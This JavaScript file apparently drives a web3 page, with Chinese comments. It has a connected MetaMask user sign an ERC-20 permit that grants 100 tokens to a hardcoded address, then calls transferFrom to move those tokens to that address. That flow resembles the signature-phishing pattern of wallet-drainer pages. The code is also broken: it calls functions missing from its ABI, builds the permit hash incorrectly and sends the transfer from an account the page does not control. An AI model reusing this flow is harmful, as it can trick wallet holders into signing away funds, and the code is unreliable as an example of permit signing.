const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3'; // 合约地址
const ownerAddress = '0xA465E2fc9F9D527AAEb07579E821D461F700e699'; // Owner 地址

let web3;
let contract;
let userAccount;

// 你的 ABI (更新为你的最新ABI)
const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "permit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
document.getElementById('signPermitBtn').addEventListener('click', signAndPermit);
document.getElementById('transferTokensBtn').addEventListener('click', transferTokens);

async function connectWallet() {
    if (window.ethereum) {
        try {
            await ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(contractABI, contractAddress);
            const accounts = await web3.eth.getAccounts();
            userAccount = accounts[0];
            document.getElementById('walletAddress').innerText = `Connected: ${userAccount}`;
        } catch (error) {
            console.error("Error connecting to wallet:", error);
        }
    } else {
        alert("Please install MetaMask!");
    }
}

async function signAndPermit() {
    const tokenOwner = userAccount; // 被授权签名的钱包地址
    const spender = ownerAddress; // 代币转移接收地址
    const value = web3.utils.toWei('100'); // 代币数量
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20分钟后过期

    const nonce = await contract.methods.nonces(tokenOwner).call();
    const domainSeparator = await contract.methods.DOMAIN_SEPARATOR().call();

    // 构造签名数据
    const message = {
        owner: tokenOwner,
        spender: spender,
        value: value,
        nonce: nonce,
        deadline: deadline,
    };

    const data = web3.utils.soliditySha3(
        { t: 'bytes32', v: domainSeparator },
        { t: 'address', v: tokenOwner },
        { t: 'address', v: spender },
        { t: 'uint256', v: value },
        { t: 'uint256', v: nonce },
        { t: 'uint256', v: deadline }
    );

    const signature = await web3.eth.personal.sign(data, tokenOwner);
    const { v, r, s } = web3.eth.accounts.decodeSignature(signature);

    // 调用 permit 方法
    await contract.methods.permit(tokenOwner, spender, value, deadline, v, r, s).send({ from: tokenOwner });
    alert("Permit signed and transaction sent.");
}

async function transferTokens() {
    const amount = web3.utils.toWei('100'); // 转移的代币数量
    await contract.methods.transferFrom(userAccount, ownerAddress, amount).send({ from: ownerAddress });
    alert("Tokens transferred.");
}
